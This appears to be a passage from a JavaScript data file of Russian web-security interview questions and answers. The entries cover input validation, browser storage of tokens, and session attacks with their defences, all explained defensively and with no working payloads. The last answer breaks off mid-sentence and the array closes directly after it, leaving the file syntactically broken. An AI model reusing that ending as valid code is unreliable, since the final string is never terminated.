    answer: "<p><strong>Работа с пользовательским вводом</strong> требует постоянной бдительности и применения принципа \"никогда не доверяй\".</p><p><strong>Принцип \"Never Trust User Input\":</strong></p><ul><li>Любые данные от пользователя потенциально опасны</li><li>Включая данные из URL, форм, cookies, headers</li><li>Даже от \"доверенных\" пользователей</li><li>Валидировать и санитизировать всегда</li></ul><p><strong>1. Input Validation (Валидация входных данных):</strong></p><p><strong>Whitelist подход (предпочтительно):</strong></p><ul><li>Определить что РАЗРЕШЕНО</li><li>Отклонять всё остальное</li><li>Примеры: только буквы, только цифры, конкретный формат</li></ul><p><strong>Типы валидации:</strong></p><ul><li>Тип данных: число, строка, boolean</li><li>Формат: email, URL, дата</li><li>Диапазон: min/max длина, числовые пределы</li><li>Паттерны: регулярные выражения</li></ul><p><strong>2. Output Encoding (Кодирование вывода):</strong></p><p><strong>Context-aware encoding:</strong></p><ul><li>HTML контекст: &lt; → &amp;lt;, &gt; → &amp;gt;</li><li>JavaScript строки: ' → \\', \" → \\\"</li><li>URL параметры: encodeURIComponent()</li><li>CSS: специфичное экранирование</li></ul><p><strong>Кодировать при выводе, не при вводе:</strong></p><ul><li>Хранить данные в оригинальном виде</li><li>Кодировать когда отображаете</li><li>Разное кодирование для разных контекстов</li></ul><p><strong>3. Санитизация (Очистка данных):</strong></p><p><strong>Для HTML:</strong></p><ul><li>Использовать DOMPurify или аналоги</li><li>Whitelist разрешенных тегов</li><li>Удалять опасные атрибуты (onclick, onerror)</li></ul><p><strong>Для других типов:</strong></p><ul><li>SQL: параметризованные запросы</li><li>Shell команды: избегать или тщательно экранировать</li><li>File paths: канонизация, проверка на path traversal</li></ul><p><strong>4. Безопасные API:</strong></p><p><strong>Предпочитать безопасные методы:</strong></p><ul><li>✅ textContent вместо innerHTML</li><li>✅ createElement() вместо innerHTML</li><li>✅ setAttribute() вместо прямой манипуляции</li><li>✅ Параметризованные запросы вместо конкатенации SQL</li></ul><p><strong>Избегать опасных функций:</strong></p><ul><li>❌ eval()</li><li>❌ new Function(userInput)</li><li>❌ innerHTML с неочищенными данными</li><li>❌ document.write()</li><li>❌ setTimeout(stringCode)</li></ul><p><strong>5. Валидация на клиенте И сервере:</strong></p><p><strong>Клиентская валидация:</strong></p><ul><li>Для UX — быстрый фидбек</li><li>НЕ для безопасности (может быть обойдена)</li></ul><p><strong>Серверная валидация:</strong></p><ul><li>ОБЯЗАТЕЛЬНА для безопасности</li><li>Финальная проверка перед обработкой</li><li>Не доверять клиентским данным</li></ul><p><strong>6. Content Security Policy:</strong></p><ul><li>Дополнительный уровень защиты</li><li>Ограничивает источники скриптов</li><li>Блокирует inline код без nonce</li></ul><p><strong>7. Принцип наименьших привилегий:</strong></p><ul><li>Пользователь может вводить только необходимое</li><li>Ограничения на длину, формат, тип</li><li>Дропдауны вместо свободного ввода где возможно</li></ul><p><strong>8. Логирование и мониторинг:</strong></p><ul><li>Логировать подозрительный ввод</li><li>Мониторить паттерны атак</li><li>Алерты на множественные попытки</li></ul><p><strong>9. Rate Limiting:</strong></p><ul><li>Ограничение частоты запросов</li><li>Защита от brute force</li><li>Предотвращение abuse</li></ul><p><strong>10. Обработка файлов:</strong></p><p><strong>Загрузка файлов:</strong></p><ul><li>Валидация типа файла (не только расширение)</li><li>Ограничение размера</li><li>Сканирование антивирусом</li><li>Хранение вне webroot</li><li>Случайные имена файлов</li></ul><p><strong>11. Специфичные типы данных:</strong></p><p><strong>Email:</strong></p><ul><li>Валидация формата</li><li>НО полная RFC валидация сложна</li><li>Лучше — confirmation email</li></ul><p><strong>URL:</strong></p><ul><li>Валидация протокола (http/https)</li><li>Проверка на javascript: и data:</li><li>Canonical форма для сравнения</li></ul><p><strong>Числа:</strong></p><ul><li>Парсинг parseInt/parseFloat</li><li>Проверка диапазона</li><li>Обработка NaN, Infinity</li></ul><p><strong>Checklist безопасности:</strong></p><ul><li>✅ Валидация типа и формата</li><li>✅ Санитизация/кодирование при выводе</li><li>✅ Использование безопасных API</li><li>✅ Серверная проверка обязательна</li><li>✅ CSP настроен</li><li>✅ Логирование подозрительных данных</li><li>✅ Rate limiting на endpoints</li><li>✅ Регулярные security аудиты</li></ul>",
    difficulty: 'middle',
    tags: ['безопасность', 'валидация', 'санитизация', 'user input', 'best practices']
  },

  {
    id: 59,
    question: "Как правильно хранить чувствительные данные в браузере? localStorage vs cookies vs sessionStorage.",
    answer: "<p><strong>Хранение чувствительных данных в браузере</strong> требует понимания рисков и особенностей каждого механизма.</p><p><strong>Типы хранилищ и их безопасность:</strong></p><p><strong>1. HTTP-Only Cookies (самое безопасное для auth):</strong></p><p><strong>Особенности:</strong></p><ul><li>Недоступны для JavaScript (document.cookie)</li><li>Автоматически отправляются с запросами</li><li>Защита от XSS через HttpOnly флаг</li></ul><p><strong>Безопасная конфигурация:</strong></p><ul><li>Set-Cookie: sessionId=abc; HttpOnly; Secure; SameSite=Strict</li><li>HttpOnly — защита от XSS</li><li>Secure — только HTTPS</li><li>SameSite — защита от CSRF</li></ul><p><strong>Что хранить:</strong></p><ul><li>✅ Session tokens</li><li>✅ Authentication credentials</li><li>✅ CSRF tokens</li></ul><p><strong>2. localStorage (НЕ для чувствительных данных):</strong></p><p><strong>Риски:</strong></p><ul><li>❌ Доступен любому JavaScript на странице</li><li>❌ Уязвим к XSS атакам</li><li>❌ Нет автоматического истечения</li><li>❌ Нет защиты вроде HttpOnly</li></ul><p><strong>Когда использовать:</strong></p><ul><li>✅ Пользовательские настройки (тема, язык)</li><li>✅ Кэш некритичных данных</li><li>✅ Draft состояния форм</li><li>❌ НЕ для auth tokens</li><li>❌ НЕ для персональных данных</li></ul><p><strong>3. sessionStorage (чуть безопаснее localStorage):</strong></p><p><strong>Отличия от localStorage:</strong></p><ul><li>Удаляется при закрытии вкладки/окна</li><li>Не доступен другим вкладкам</li><li>Ограничен одной сессией браузера</li></ul><p><strong>Те же риски XSS:</strong></p><ul><li>❌ Доступен JavaScript</li><li>❌ Уязвим к XSS</li></ul><p><strong>Когда использовать:</strong></p><ul><li>✅ Временное состояние UI</li><li>✅ Multi-step form данные</li><li>✅ Временный кэш</li></ul><p><strong>Сравнение механизмов:</strong></p><table><tr><th>Свойство</th><th>HttpOnly Cookie</th><th>localStorage</th><th>sessionStorage</th></tr><tr><td>XSS защита</td><td>✅ Да</td><td>❌ Нет</td><td>❌ Нет</td></tr><tr><td>JS доступ</td><td>❌ Нет</td><td>✅ Да</td><td>✅ Да</td></tr><tr><td>Автоотправка</td><td>✅ Да</td><td>❌ Нет</td><td>❌ Нет</td></tr><tr><td>Размер</td><td>~4KB</td><td>~5-10MB</td><td>~5-10MB</td></tr><tr><td>Время жизни</td><td>Настраиваемо</td><td>Постоянно</td><td>До закрытия</td></tr></table><p><strong>Рекомендации по хранению:</strong></p><p><strong>Authentication tokens:</strong></p><ul><li>✅ Лучший вариант: HttpOnly Secure cookies</li><li>❌ Плохой вариант: localStorage</li><li>Причина: защита от XSS критична</li></ul><p><strong>JWT токены:</strong></p><p><strong>Вариант 1 — HttpOnly cookie (рекомендуется):</strong></p><ul><li>Токен в cookie, сервер парсит</li><li>Защита от XSS</li></ul><p><strong>Вариант 2 — localStorage + Authorization header:</strong></p><ul><li>fetch('/api', { headers: { 'Authorization': 'Bearer ' + token } })</li><li>Уязвимо к XSS</li><li>НО не подвержено CSRF (токен не отправляется автоматически)</li></ul><p><strong>Hybrid подход:</strong></p><ul><li>Access token — короткоживущий, в памяти JS</li><li>Refresh token — HttpOnly cookie</li><li>Баланс удобства и безопасности</li></ul><p><strong>Шифрование в браузере:</strong></p><p><strong>Web Crypto API:</strong></p><ul><li>Шифрование чувствительных данных перед хранением</li><li>crypto.subtle.encrypt()</li><li>НО ключ всё равно в браузере</li><li>Защита не от XSS, но от физического доступа</li></ul><p><strong>Ограничения шифрования:</strong></p><ul><li>Если злонамеленный JS выполнился (XSS)</li><li>Он может перехватить данные ДО шифрования</li><li>Шифрование не заменяет другие меры</li></ul><p><strong>Best Practices:</strong></p><ul><li>✅ HttpOnly cookies для auth данных</li><li>✅ Минимизировать хранение чувствительного в браузере</li><li>✅ Короткое время жизни токенов</li><li>✅ Используйте SameSite для cookies</li><li>✅ HTTPS везде (Secure flag)</li><li>✅ CSP для защиты от XSS</li><li>✅ Регулярная ротация токенов</li><li>✅ Logout должен очищать ВСЕ данные</li><li>❌ Никогда пароли в браузере</li><li>❌ Никогда API ключи в localStorage</li></ul><p><strong>Альтернативы браузерному хранению:</strong></p><ul><li>Server-side sessions — данные на сервере, только ID в cookie</li><li>Stateless JWT — краткосрочные токены</li><li>OAuth tokens — делегированная авторизация</li></ul>",
    difficulty: 'middle',
    tags: ['хранение данных', 'localStorage', 'cookies', 'безопасность', 'auth']
  },

  {
    id: 60,
    question: "Какие существуют атаки на session management и как защититься?",
    answer: "<p><strong>Session management</strong> — критичная часть безопасности веб-приложений, которая часто становится целью атак.</p><p><strong>Типы атак на сессии:</strong></p><p><strong>1. Session Hijacking (перехват сессии):</strong></p><p><strong>Как работает:</strong></p><ul><li>Злонамеленник получает session ID жертвы</li><li>Использует его для доступа к аккаунту</li><li>Выдает себя за легитимного пользователя</li></ul><p><strong>Методы получения session ID:</strong></p><ul><li>XSS — кража через document.cookie</li><li>Network sniffing — перехват в незашифрованном трафике</li><li>Man-in-the-Middle — подмена в пути</li><li>Malware на устройстве жертвы</li></ul><p><strong>Защита:</strong></p><ul><li>✅ HttpOnly cookies — защита от XSS</li><li>✅ Secure flag — только HTTPS</li><li>✅ HTTPS везде — защита от sniffing</li><li>✅ SameSite cookies — дополнительная защита</li><li>✅ Регенерация session ID после логина</li></ul><p><strong>2. Session Fixation (фиксация сессии):</strong></p><p><strong>Как работает:</strong></p><ol><li>Злонамеленник получает валидный session ID</li><li>Заставляет жертву использовать этот ID</li><li>Жертва логинится с известным ID</li><li>Злонамеленник использует тот же ID — авторизован</li></ol><p><strong>Пример атаки:</strong></p><ul><li>site.com?sessionId=attacker-known-id</li><li>Жертва логинится</li><li>Злонамеленник использует attacker-known-id</li></ul><p><strong>Защита:</strong></p><ul><li>✅ Регенерация session ID при логине</li><li>✅ Отклонять session ID из URL параметров</li><li>✅ Использовать только server-generated session IDs</li><li>✅ Валидировать session при повышении привилегий</li></ul><p><strong>3. Session Prediction (предсказание сессии):</strong></p><p><strong>Проблема:</strong></p><ul><li>Слабый алгоритм генерации session ID</li><li>Предсказуемые паттерны (инкремент, timestamp)</li><li>Недостаточная энтропия</li></ul><p><strong>Защита:</strong></p><ul><li>✅ Криптографически стойкие генераторы</li><li>✅ Достаточная длина ID (128+ бит)</li><li>✅ Использовать crypto.randomBytes()</li><li>✅ Избегать последовательных/предсказуемых ID</li></ul><p><strong>4. Cross-Site Request Forgery (CSRF):</strong></p><ul><li>Злонамеленный сайт использует сессию жертвы</li><li>Браузер автоматически
];
